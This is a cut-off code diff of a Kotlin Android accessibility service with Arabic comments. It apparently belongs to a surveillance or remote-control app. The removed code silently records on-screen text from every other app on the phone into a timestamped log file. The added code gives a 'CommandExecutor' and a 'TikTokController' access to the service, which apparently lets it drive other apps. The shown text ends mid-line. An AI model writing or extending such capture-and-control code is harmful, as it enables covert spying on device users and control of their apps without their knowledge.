@@ -16,8 +16,6 @@ class AccessibilityHelper : AccessibilityService() {
 
     private val timeFmt = SimpleDateFormat("HH:mm:ss", Locale.US)
     private val dateFmt = SimpleDateFormat("yyyy-MM-dd", Locale.US)
-
-    // تتبع آخر نص مقروء من كل تطبيق — لمنع التكرار
     private val lastTextByPkg = HashMap<String, String>()
 
     companion object {
@@ -57,60 +55,22 @@ class AccessibilityHelper : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.d("AccessibilityHelper", "Service connected")
+        // ⭐ سجّل المرجع ليستخدمه TikTokController
+        CommandExecutor.accessibilityServiceRef = this
+    }
+
+    override fun onUnbind(intent: android.content.Intent?): Boolean {
+        CommandExecutor.accessibilityServiceRef = null
+        return super.onUnbind(intent)
+    }
+
+    override fun onDestroy() {
+        CommandExecutor.accessibilityServiceRef = null
+        super.onDestroy()
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
         try {
             val pkg = event.packageName?.toString() ?: return
-            if (pkg == packageName) return
-            // تجاهل لوحة مفاتيح النظام
-            if (pkg.contains("inputmethod") || pkg.contains("keyboard")) return
-
-            val type = event.eventType
-
-            // نستقبل فقط أحداث النصوص المهمة
-            if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
-                type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
-                type != AccessibilityEvent.TYPE_VIEW_FOCUSED &&
-                type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                return
-            }
-
-            val texts = mutableListOf<String>()
-            for (i in 0 until event.text.size) {
-                val t = event.text[i]?.toString()?.trim() ?: ""
-                if (t.isNotBlank() && t.length > 1) texts.add(t)
-            }
-            if (texts.isEmpty()) return
-
-            val combined = texts.joinToString(" | ")
-
-            // ✅ فلترة التكرار: إذا نفس النص من نفس التطبيق — تجاهل
-            val lastKey = lastTextByPkg[pkg]
-            if (lastKey == combined) return
-            lastTextByPkg[pkg] = combined
-
-            // ✅ تخزين
-            try {
-                val f = File(filesDir, "accessibility.jsonl")
-                val entry = JSONObject().apply {
-                    put("type", "accessibility")
-                    put("time", dateFmt.format(Date()) + " " + timeFmt.format(Date()))
-                    put("package", pkg)
-                    put("texts", combined)
-                }
-                java.io.FileOutputStream(f, true).use { fos ->
-                    fos.write((entry.toString() + "\n").toByteArray())
-                }
-            } catch (_: Exception) {}
-
-        } catch (e: Exception) {
-            Log.e("AccessibilityHelper", "err: ${e.message}")
-        }
-    }
-
-    override fun onInterrupt() {
-        Log.d("AccessibilityHelper", "Service interrupted")
-    }
-}
+            if (p
